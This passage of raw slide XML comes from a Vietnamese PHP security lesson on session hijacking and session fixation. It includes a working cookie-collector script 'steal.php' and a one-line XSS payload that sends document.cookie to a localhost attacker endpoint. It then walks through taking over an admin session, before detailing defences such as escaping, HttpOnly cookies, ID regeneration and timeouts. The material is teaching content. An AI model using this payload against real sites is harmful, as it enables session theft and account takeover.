              <a:t>C:/xampp/htdocs/attacker/steal.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t>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664208"/>
            <a:ext cx="8412480" cy="1499616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&lt;?php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// Ghi lai moi thu duoc gui toi trong tham so "c"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$cookie = $_GET["c"] ?? "";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$dong   = date("H:i:s") . " | " . $cookie . PHP_EOL;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file_put_contents(__DIR__ . "/cookies.txt", $dong, FILE_APPEND);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?&gt;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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (7/12)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/>
              <a:t>Bước 3 — kẻ tấn công nhập vào ô "Tên sản phẩm"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t> (một dòng):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664208"/>
            <a:ext cx="8412480" cy="731520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&lt;script&gt;new Image().src="http://127.0.0.1/attacker/steal.php?c="+encodeURIComponent(document.cookie)&lt;/script&gt;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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (8/12)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1800" b="0"/>
              <a:t>Giải thích: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> là chuỗi cookie của trang hiện tại; </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>new Image().src = URL</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> khiến trình duyệt gửi một request GET tới URL đó (như tải ảnh) — kể cả sang site khác. Cookie nằm trong tham số </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>c</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>Bước 4 — nạn nhân chỉ cần mở trang.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> Không cần bấm gì. Mở </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>attacker/cookies.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>: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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (9/12)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412480" cy="731520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09:41:07 | PHPSESSID=k3j9x2m8q1vh7t4n0b5c6d2e3f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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (10/12)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1800" b="1"/>
              <a:t>Bước 5 — chiếm phiên.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> Mở trình duyệt khác (hoặc cửa sổ ẩn danh), vào </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>http://localhost/course8/</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> → DevTools → *Application* → *Cookies* → sửa/tạo cookie </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>PHPSESSID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> = giá trị vừa lấy → F5. Server đọc ID, mở đúng file session của admin → </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>đã vào với quyền admin</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> mà không đăng nhập.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>Đây gọi là </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>Session Hijacking</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> (chiếm phiên). Đây cũng là lý do ID phải được bảo vệ như mật khẩu.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>Cách phòng thủ — nhiều lớp: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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (11/12)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Lớp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Cách làm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Tác dụng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/>
                        <a:t>1 (gốc rễ)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anToan()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> / </a:t>
                      </a:r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htmlspecialchars()</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> mọi dữ liệu in ra HTML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/>
                        <a:t>Script bị in thành chữ, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="1"/>
                        <a:t>không chạy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/>
                        <a:t>2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/>
                        <a:t>Cookie session đặt </a:t>
                      </a:r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httponly =&gt; true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document.cookie</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="1"/>
                        <a:t>không thấy</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> </a:t>
                      </a:r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PHPSESSID</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> → bước 3 chỉ thu được chuỗi rỗng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/>
                        <a:t>3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secure =&gt; true</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> (khi có HTTPS)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/>
                        <a:t>Cookie không đi qua kết nối không mã hóa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/>
                        <a:t>4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samesite =&gt; "Lax"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/>
                        <a:t>Hạn chế trình duyệt gửi cookie trong request từ site khác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/>
                        <a:t>5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latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>session_regenerate_id(true)</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> khi đăng nhập / đổi quyền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/>
                        <a:t>ID cũ vô dụng sau khi đổi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/>
                        <a:t>6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/>
                        <a:t>Hạn chế thời gian sống session, nút Đăng xuất hủy session thật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/>
                        <a:t>Giảm cửa sổ bị lợi dụng</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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/>
              <a:t>2.5. XSS đánh cắp Session ID — demo (12/12)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1600" b="0"/>
              <a:t>Thử lại bước 3 sau khi thêm </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"httponly" =&gt; true</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> vào </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>session_set_cookie_params()</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> và đổi </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;?= $sp["name"] ?&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> thành </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;?= anToan($sp["name"]) ?&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>: script không còn chạy, và dù chạy cũng không lấy được </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>PHPSESSID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lưu ý:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> chỉ che *cookie*, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" i="1" b="1">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>không</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ngăn XSS. Script vẫn có thể gửi request thay người dùng (xóa sản phẩm, đổi mật khẩu…) ngay trong trình duyệt của họ. Vì thế lớp 1 (</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>anToan()</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" i="1" b="0">
                <a:solidFill>
                  <a:srgbClr val="666666"/>
                </a:solidFill>
              </a:rPr>
              <a:t>) mới là lớp bắt buộc, các lớp còn lại chỉ giảm thiệt hại.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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (1/24)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2000" b="1"/>
              <a:t>Vấn đề 1 — Session Fixation (cố định phiên).</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> Ở 2.5 kẻ tấn công *ăn cắp* ID sau khi đăng nhập. Fixation ngược lại: kẻ tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>gài sẵn ID trước</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>, chờ nạn nhân đăng nhập vào chính ID đó.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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (2/24)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755648"/>
            <a:ext cx="8412480" cy="1703832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1. Hacker vao site, nhan PHPSESSID=AAA (chua dang nhap, session rong)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2. Hacker lua nan nhan dung ID AAA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(link ...?PHPSESSID=AAA, hoac ghi cookie qua XSS / subdomain)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3. Nan nhan dang nhap. Neu code KHONG doi ID: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file sess_AAA bay gio chua user_id cua nan nhan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4. Hacker gui cookie PHPSESSID=AAA  -&gt;  da la nan nhan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(hacker khong can an cap gi sau khi nan nhan login)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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (3/24)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2000" b="1"/>
              <a:t>Cách chặn:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> gọi </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>session_regenerate_id(true)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>ngay sau khi xác thực thành công</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> (đã có trong </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>login.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> ở 2.3). PHP sinh ID mới </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>BBB</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>, chuyển dữ liệu sang file mới, và tham số </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>true</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>xóa file cũ</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sess_AAA</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> — ID mà hacker đang giữ trở thành vô dụng.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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (4/24)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938528"/>
          <a:ext cx="822960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Không đổi ID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Có </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1300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session_regenerate_id(true)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/>
                        <a:t>ID trước login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AAA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AAA</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1300" b="0"/>
                        <a:t> (hacker biết)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/>
                        <a:t>ID sau login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AAA</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1300" b="0"/>
                        <a:t> → hacker vào được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BBB</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1300" b="0"/>
                        <a:t> → hacker không biết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/>
                        <a:t>File </a:t>
                      </a:r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sess_AAA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Chứa dữ liệu người dùng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Bị xóa</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (5/24)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2000" b="0"/>
              <a:t>Nguyên tắc chung: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>đổi ID mỗi khi mức đặc quyền thay đổi</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> — đăng nhập, đăng xuất, nâng quyền admin, đổi mật khẩu. Thêm hai cấu hình để chặn từ gốc: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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (6/24)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755648"/>
            <a:ext cx="8412480" cy="1023111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&lt;?php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ini_set("session.use_strict_mode", 1);    // server tu choi ID do client tu bia ra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ini_set("session.use_only_cookies", 1);   // khong nhan ID qua URL (?PHPSESSID=AAA)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?&gt;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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (7/24)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1800" b="1"/>
              <a:t>Vấn đề 2 — Vì sao phải có timeout?</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t> ID là chìa khóa. Chìa khóa càng sống lâu, cơ hội bị lợi dụng càng nhiều: người dùng quên đăng xuất ở máy quán net/máy công ty, ID đã bị lộ (mục 2.5) mà không ai hay, máy bị người khác mượn. Timeout </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="1"/>
              <a:t>giới hạn thời gian thiệt hại</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1800" b="0"/>
              <a:t>. Có hai loại cần cả hai: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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (8/24)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938528"/>
          <a:ext cx="8229600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Loại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Ý nghĩa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Ví dụ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1"/>
                        <a:t>Idle timeout</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> (không hoạt động)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/>
                        <a:t>Im lặng quá X phút thì hết hạn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/>
                        <a:t>30 phút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1"/>
                        <a:t>Absolute timeout</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0"/>
                        <a:t> (tuyệt đối)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/>
                        <a:t>Dù hoạt động liên tục, quá Y giờ kể từ lúc login thì bắt đăng nhập lại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000" b="0"/>
                        <a:t>8 giờ</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (9/24)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2000" b="0"/>
              <a:t>Không có absolute timeout thì ID bị lộ vẫn dùng được mãi nếu hacker cứ gửi request đều đặn.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>Vấn đề 3 — Quan hệ giữa timeout của cookie và của session.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> Có </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="1"/>
              <a:t>hai đồng hồ ở hai nơi khác nhau</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t>, và chỉ một cái đáng tin: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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (10/24)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938528"/>
          <a:ext cx="822960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Cookie (trình duyệt)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Dữ liệu session (server)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/>
                        <a:t>Cấu hình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Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>lifetime</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1100" b="0"/>
                        <a:t> trong </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1100" b="0">
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>session_set_cookie_params()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Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>session.gc_maxlifetime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/>
                        <a:t>Ai kiểm soát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100" b="1"/>
                        <a:t>Người dùng</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1100" b="0"/>
                        <a:t> (xóa, sửa, giữ lại cookie tùy ý)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100" b="1"/>
                        <a:t>Server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/>
                        <a:t>Đáng tin?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100" b="0"/>
                        <a:t>Không — chỉ là gợi ý cho trình duyệt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100" b="0"/>
                        <a:t>Có — quyết định cuối cùng</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (11/24)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1600" b="0"/>
              <a:t>Hai điểm dễ nhầm:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>Hết hạn cookie ≠ hết hạn session.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> Nếu hacker đã chép ID rồi tự gửi lại, cookie "hết hạn" ở</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>trình duyệt nạn nhân chẳng ảnh hưởng gì; chừng nào file session còn trên server, ID vẫn dùng được.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>`gc_maxlifetime` không đảm bảo xóa đúng giờ.</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> PHP chỉ dọn rác ngẫu nhiên (mặc định ~1% số</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>request), nên file hết hạn có thể còn nằm đó rất lâu. Vì vậy phải tự kiểm tra thời gian trong</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>code, không chỉ dựa vào cấu hình.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>Mối quan hệ nên thiết lập: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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (12/24)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938528"/>
          <a:ext cx="82296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Thiết lập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Giá trị gợi ý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Lý do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/>
                        <a:t>Cookie </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1100" b="0">
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>lifetime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Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>0</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1100" b="0"/>
                        <a:t> (cookie phiên)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100" b="0"/>
                        <a:t>Đóng trình duyệt là mất ID, không để ID nằm lại trên ổ đĩa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Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>gc_maxlifetime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100" b="0"/>
                        <a:t>≥ idle timeout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100" b="0"/>
                        <a:t>Server không xóa dữ liệu trước khi code kiểm tra kịp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/>
                        <a:t>Idle timeout (trong code)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100" b="0"/>
                        <a:t>15–30 phút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100" b="0"/>
                        <a:t>Chặn máy bỏ quên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/>
                        <a:t>Absolute timeout (trong code)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100" b="0"/>
                        <a:t>4–8 giờ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100" b="0"/>
                        <a:t>Chặn ID bị lộ dùng mãi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/>
                        <a:t>"Ghi nhớ đăng nhập"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100" b="1"/>
                        <a:t>Không</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1100" b="0"/>
                        <a:t> kéo dài cookie </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1100" b="0">
                          <a:latin typeface="Consolas"/>
                          <a:ea typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>PHPSESSID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100" b="0"/>
                        <a:t>Dùng token riêng (xem ghi chú dưới)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="54864" marR="54864" marT="27432" marB="27432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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (13/24)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1600" b="0"/>
              <a:t>Ghi chú về "Ghi nhớ đăng nhập": đừng làm bằng cách cho </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>PHPSESSID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> sống 30 ngày — đó là chìa khóa vạn năng tồn tại 30 ngày. Cách chuẩn là cookie riêng chứa </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>token ngẫu nhiên</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>, CSDL chỉ lưu bản </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>băm</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> của token, có hạn dùng và đổi token mỗi lần dùng (nâng cao, ngoài phạm vi buổi này). Trong bài này cookie </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>remember_user</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> chỉ điền sẵn tên đăng nhập, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>không</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> cấp quyền.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1"/>
              <a:t>Cài đặt</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t> — file cấu hình dùng chung </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>app/common/sessionConfig.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1600" b="0"/>
              <a:t>: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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (14/24)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755648"/>
            <a:ext cx="8412480" cy="4018280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&lt;?php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// File: app/common/sessionConfig.php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// Thay moi cho goi session_start() truc tiep bang file nay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define("SESSION_IDLE_TIMEOUT", 30 * 60);       // 30 phut khong thao tac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define("SESSION_MAX_LIFETIME", 8 * 60 * 60);   // toi da 8 gio ke tu luc login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ini_set("session.use_strict_mode", 1);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ini_set("session.use_only_cookies", 1);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ini_set("session.gc_maxlifetime", SESSION_IDLE_TIMEOUT);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session_set_cookie_params([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"lifetime" =&gt; 0,          // cookie phien: dong trinh duyet la mat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"path"     =&gt; "/",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"secure"   =&gt; false,      // true khi chay HTTPS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"httponly" =&gt; true,       // JS khong doc duoc (chong XSS an cap)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"samesite" =&gt; "Lax",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]);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if (session_status() === PHP_SESSION_NONE)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session_start();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?&gt;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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (15/24)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755648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/>
              <a:t>Cập nhật </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>app/common/checkLogin.php</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t> để kiểm tra timeout </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="1"/>
              <a:t>phía server</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1500" b="0"/>
              <a:t> ở mọi trang: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231136"/>
            <a:ext cx="8412480" cy="4306824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&lt;?php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// File: app/common/checkLogin.php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require_once __DIR__ . "/sessionConfig.php";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if (!isset($_SESSION["user_id"]))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header("Location: login.php");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exit();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$bayGio = time();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$roiQuaLau = ($bayGio - ($_SESSION["last_activity"] ?? 0)) &gt; SESSION_IDLE_TIMEOUT;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$songQuaLau = ($bayGio - ($_SESSION["login_time"] ?? 0)) &gt; SESSION_MAX_LIFETIME;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if ($roiQuaLau || $songQuaLau)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    // Huy session phia server + xoa cookie phia browser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$_SESSION = [];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session_destroy();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setcookie(session_name(), "", time() - 3600, "/");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header("Location: login.php?timeout=1");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exit();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// Con hieu luc: tinh lai moc "hoat dong gan nhat"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$_SESSION["last_activity"] = $bayGio;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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (16/24)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755648"/>
            <a:ext cx="8412480" cy="1942084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function yeuCauAdmin()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if (($_SESSION["is_admin"] ?? 0) !== 1)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die("Bạn không có quyền truy cập trang này.");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?&gt;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/>
              <a:t>2.6. Đổi Session ID sau khi login và thiết lập timeout (17/24)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2000" b="1"/>
              <a:t>`login.php` bản hoàn chỉnh</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0"/>
              <a:t> (thay cho bản ở 2.3): dùng </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sessionConfig.php</a:t>
            </a:r>
            <a:r>
